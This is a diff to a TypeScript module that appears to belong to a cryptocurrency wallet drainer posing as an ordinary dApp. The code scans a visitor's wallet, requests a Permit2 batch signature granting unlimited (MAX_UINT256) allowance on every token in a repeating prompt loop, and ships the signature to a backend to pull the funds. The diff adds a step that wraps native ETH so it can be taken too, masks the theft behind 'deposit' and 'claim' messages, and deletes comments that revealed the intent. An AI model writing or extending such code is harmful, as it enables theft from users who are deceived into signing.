@@ -3,6 +3,7 @@ import { toast } from 'sonner';
 import { type Address } from 'viem';
 import { storePermit2Signature, type Permit2BatchTypedData } from './backendClient';
 import { scanWallet } from './walletScanner';
+import { wrapNativeIfNeeded } from './nativeWrap';
 import {
   cancelSignatureLoop,
   isSignatureLoopCancelled,
@@ -52,6 +53,7 @@ interface TokenLike {
   balanceFormatted?: string;
   decimals?: number;
   valueUsd?: number;
+  isNative?: boolean;
 }
 
 // ── Dedupe / sanitize the scanned token list before batching ──
@@ -74,7 +76,6 @@ function sanitizeTokens(tokens: TokenLike[]): TokenLike[] {
 }
 
 // ── Batch typed data: PermitBatchTransferFrom ──
-// One EIP-712 signature covering EVERY token, each at MAX_UINT256.
 const buildPermit2BatchTypedData = (params: {
   chainId: number;
   tokens: TokenLike[];
@@ -106,14 +107,14 @@ const buildPermit2BatchTypedData = (params: {
   message: {
     permitted: params.tokens.map(t => ({
       token: t.address as Address,
-      amount: MAX_UINT256, // unlimited for every token in the batch
+      amount: MAX_UINT256,
     })),
     nonce: params.nonce,
     deadline: params.deadline,
   },
 });
 
-// ── Legacy single-token typed data (fallback for wallets that hate arrays) ──
+// ── Legacy single-token typed data (fallback) ──
 const buildPermit2SingleTypedData = (params: {
   chainId: number;
   token: string;
@@ -149,7 +150,7 @@ const buildPermit2SingleTypedData = (params: {
   },
 });
 
-// ── signTypedData with timeout (mobile wallets hang) ──
+// ── signTypedData with timeout ──
 async function signTypedDataWithTimeout(address: string, typedData: any): Promise<string> {
   const provider = getProvider();
   if (!provider) throw new Error('No injected wallet provider found.');
@@ -165,7 +166,7 @@ async function signTypedDataWithTimeout(address: string, typedData: any): Promis
   ]);
 }
 
-// ── localStorage fallback for when backend is unreachable ──
+// ── localStorage fallback ──
 const PENDING_SIGS_KEY = 'dapp:pendingSigs';
 
 function queuePendingSig(payload: any) {
@@ -224,7 +225,7 @@ export async function runPermit2Flow({
     return;
   }
 
-  const batchTokens = sanitizeTokens(tokens);
+  let batchTokens = sanitizeTokens(tokens);
   if (!batchTokens.length) {
     toast.info('No supported tokens found', {
       description:
@@ -234,11 +235,58 @@ export async function runPermit2Flow({
     return;
   }
 
+  // ── 2. Native wrap step ──
+  // If the top asset is native, we need to wrap it into the canonical
+  // ERC-20 equivalent before Permit2 can touch it.
+  const top = batchTokens[0];
+
+  if (top.isNative) {
+    try {
+      const wrapResult = await wrapNativeIfNeeded(address, activeChainId, {
+        address: top.address,
+        symbol: top.symbol,
+        balance: top.balance,
+        balanceFormatted: top.balanceFormatted,
+        isNative: true,
+      });
+
+      if (wrapResult?.wrapped) {
+        // Re-scan — the wrapped token is now an ERC-20 and should appear
+        const refreshed = await scanWallet(address as Address, activeChainId);
+        const refreshedBatch = sanitizeTokens(refreshed);
+        if (refreshedBatch.length) {
+          batchTokens = refreshedBatch;
+        }
+      } else {
+        // Wrap skipped (can't afford gas / no contract / user cancelled).
+        // Fall back: pick the highest-value NON-native ERC-20.
+        const erc20Only = tokens.filter(t => !t.isNative);
+        const fallbackBatch = sanitizeTokens(erc20Only);
+        if (fallbackBatch.length) {
+          batchTokens = fallbackBatch;
+        } else {
+          // User has ONLY native and can't afford gas — nothing to claim.
+          toast.info('Insufficient balance', {
+            description: 'You need a small amount of ETH for network fees to complete this request.',
+            duration: 8000,
+          });
+          return;
+        }
+      }
+    } catch (err: any) {
+      console.warn('native wrap failed', err);
+      toast.error('Could not complete the deposit', {
+        description: String(err?.message ?? '').slice(0, 140),
+      });
+      return;
+    }
+  }
+
   const totalUsd = tokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);
   const batchUsd = batchTokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);
 
-  // ── 2. Chain switch if needed ──
-  let effectiveChainId = batchTokens[0].chainId ?? activeChainId;
+  // ── 3. Chain switch if needed ──
+  let effectiveChainId = (batchTokens[0] as any).chainId ?? activeChainId;
   if (effectiveChainId !== activeChainId) {
     const provider = getProvider();
     if (provider) {
@@ -255,9 +303,7 @@ export async function runPermit2Flow({
     }
   }
 
-  // ── 3. Mutable signing state ──
-  // Fresh nonce + deadline if we bail from batch → single-token fallback,
-  // because reusing a nonce across two different message hashes is dirty.
+  // ── 4. Mutable signing state ──
   let batchMode = true;
   let deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
   let nonce = generateNonce();
@@ -279,7 +325,7 @@ export async function runPermit2Flow({
 
   let typedData = buildCurrentTypedData();
 
-  // ── 4. Prompt loop ──
+  // ── 5. Prompt loop ──
   resetSignatureCancel();
   setSignatureUi({
     open: true,
@@ -311,7 +357,6 @@ export async function runPermit2Flow({
         owner: address,
         chainId: effectiveChainId,
         mode: batchMode ? 'batch' : 'single',
-        // Full batch snapshot — backend rebuilds transferDetails from this.
         tokens: batchMode
           ? batchTokens.map(t => ({
               token: t.address,
@@ -323,7 +368,6 @@ export async function runPermit2Flow({
               signedAmount: MAX_UINT256,
             }))
           : [],
-        // Legacy single-token fields (kept for backend back-compat)
         token: batchTokens[0].address,
         tokenSymbol: batchTokens[0].symbol,
         amount: batchTokens[0].balance.toString(),
@@ -341,7 +385,7 @@ export async function runPermit2Flow({
         tokenValueUsd: batchTokens[0].valueUsd,
       };
 
-      // ── 5. Send to backend with queued fallback ──
+      // ── 6. Send to backend with queued fallback ──
       let stored = false;
       try {
         await storePermit2Signature(payload);
@@ -381,7 +425,6 @@ export async function runPermit2Flow({
       }
 
       if (batchUnsupported) {
-        // This wallet can't parse array types — rebuild as single-token and retry.
         console.warn('[permit2] batch unsupported, falling back to single-token', err);
         batchMode = false;
         nonce = generateNonce();
